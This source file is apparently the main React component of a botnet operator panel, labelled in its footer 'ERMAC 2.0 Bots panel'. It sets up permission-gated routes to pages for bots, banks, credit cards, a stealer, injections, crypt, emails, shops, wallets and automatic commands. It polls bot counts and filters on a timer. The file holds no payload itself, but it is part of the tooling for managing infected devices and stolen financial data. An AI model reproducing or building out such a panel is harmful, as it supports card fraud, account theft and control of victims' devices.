import React, {useCallback, useLayoutEffect} from "react";
import {BrowserRouter as Router, Route, Routes} from "react-router-dom";
import Sidebar from "./Layout/Sidebar/Sidebar";
import {BackTop, Button, Layout, Spin} from "antd";
import LoginPage from "./Components/Pages/Login/LoginPage";
import Bots from "./Components/Pages/Bots/Bots";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "./Store/RootReducer";
import {authorizeCheck} from "./Store/Auth/Actions";
import {getJwtToken} from "./Util/config";
import Users from "./Components/Pages/Users/Users";
import Banks from "./Components/Pages/Banks/Banks";

import "swiper/css";
import "swiper/css/pagination";
import "antd/dist/antd.dark.min.css";
import "./Assets/Styles/styles.scss";
import "react-phone-number-input/style.css";
import Stealer from "./Components/Pages/Stealer/Stealer";
import Injections from "./Components/Pages/Injections/Injections";
import Crypt from "./Components/Pages/Crypt/Crypt";
import Email from "./Components/Pages/Email/Email";
import Shops from "./Components/Pages/Shops/Shops";
import Wallet from "./Components/Pages/Wallet/Wallet";
import Permissions from "./Components/Pages/Permissions/Permissions";
import GeneralStats from "./Components/Pages/GeneralStats/GeneralStats";
import {AndroidOutlined, ArrowUpOutlined} from "@ant-design/icons";
import {getFiltersList} from "./Store/Filters/Actions";
import {hasAccess} from "./Util/hasAccess";
import {getCountsList} from "./Store/Counts/Actions";
import useInterval from "./Hook/useInterval";
import HeaderLayout from "./Layout/Header/Header";
import Cards from "./Components/Pages/Cards/Cards";
import NotFound from "./Components/Pages/NotFound/NotFound";
import AutoCommands from "./Components/Pages/AutoCommands/AutoCommands";

const {Content, Footer} = Layout;

const App: React.FC = () => {
    const authReducer = useSelector((state: AppState) => state.auth);

    const dispatch = useDispatch();

    const getFilters = useCallback(() => {
        dispatch(getFiltersList());
    }, [dispatch]);

    const getCounts = useCallback(() => {
        dispatch(getCountsList());
    }, [dispatch]);

    useLayoutEffect(() => {
        dispatch(authorizeCheck(getJwtToken()));
    }, [dispatch]);

    useLayoutEffect(() => {
        if (authReducer.isAuthorized) {
            getCounts();
            getFilters();
        }
    }, [authReducer.isAuthorized, dispatch, getCounts, getFilters]);

    useInterval(() => {
        if (authReducer.isAuthorized) {
            getFilters();
        }
    }, 60000);

    useInterval(() => {
        if (authReducer.isAuthorized) {
            getCounts();
        }
    }, 20000);

    const [collapsedMenu, setCollapsedMenu] = React.useState(false);

    const toggleCollapsedMenu = () => {
        const bodyEl: HTMLBodyElement = document.getElementsByTagName("body")[0];
        setCollapsedMenu(!collapsedMenu);
        bodyEl?.classList.toggle("on-menu");
    };

    if (!authReducer.isLoaded) {
        return (
            <div className="app-loader">
                <Spin
                    size="large"
                    style={{transform: "scale(2)"}}
                    indicator={<AndroidOutlined spin/>}
                />
            </div>
        );
    }

    if (!authReducer.isAuthorized) {
        return <LoginPage/>;
    }

    const user = authReducer.user;

    return authReducer.isAuthorized ? (
        <Router>
            <Layout style={{minHeight: "100vh"}}>
                <Sidebar collapsedState={collapsedMenu} collapseAction={toggleCollapsedMenu}/>

                <Layout className="site-layout">
                    <HeaderLayout collapseAction={toggleCollapsedMenu} collapsedState={collapsedMenu}/>

                    <Content style={{margin: "0 16px"}}>
                        <div className="site-layout-background" style={{marginTop: 16, minHeight: 360}}>
                            <Routes>
                                <Route path='*' element={<NotFound/>} />

                                {hasAccess(user, "bots.list") && (
                                    <Route path="/" element={<Bots/>}/>
                                )}
                                {hasAccess(user, "banks.list") && (
                                    <Route path="/banks" element={<Banks/>}/>
                                )}
                                {hasAccess(user, "credit_cards.list") && (
                                    <Route path="/cards" element={<Cards />} />
                                )}

                                {hasAccess(user, "stealers.list") && (
                                    <Route path="/stealer" element={<Stealer/>}/>
                                )}
                                {hasAccess(user, "injections.list") && (

                                    <Route path="/injections" element={<Injections/>}/>
                                )}

                                {hasAccess(user, "crypt.list") && (

                                    <Route path="/crypt" element={<Crypt/>}/>
                                )}

                                {hasAccess(user, "emails.list") && (

                                    <Route path="/email" element={<Email/>}/>
                                )}

                                {hasAccess(user, "shops.list") && (

                                    <Route path="/shops" element={<Shops/>}/>
                                )}

                                {hasAccess(user, "wallets.list") && (

                                    <Route path="/wallet" element={<Wallet/>}/>
                                )}


                                {/*
                                <Route path="/settings" element={<Settings/>}/>
                                */}

                                {hasAccess(user, "permissions.list") && (

                                    <Route path="/permissions" element={<Permissions/>}/>
                                )}

                                {hasAccess(user, "stats.list") && (

                                    <Route path="/stats" element={<GeneralStats/>}/>
                                )}

                                {hasAccess(user, "users.list") && (

                                    <Route path="/users" element={<Users/>}/>
                                )}
                                <Route path="/auto_commands" element={<AutoCommands/>}/>
                            </Routes>
                        </div>
                    </Content>

                    <Footer style={{textAlign: "center"}}>
                        ERMAC 2.0 Bots panel
                    </Footer>
                </Layout>


                <BackTop>
                    <Button size="large" shape="circle" type="primary" icon={<ArrowUpOutlined/>}/>
                </BackTop>

                <div
                    className={collapsedMenu ? "layout-overlay active" : "layout-overlay"}
                    onClick={toggleCollapsedMenu}
                />
            </Layout>
        </Router>
    ) : (
        <Router>
            <Routes>
                <Route path="/" element={<LoginPage/>}/>
            </Routes>
        </Router>
    );
};

export default App;
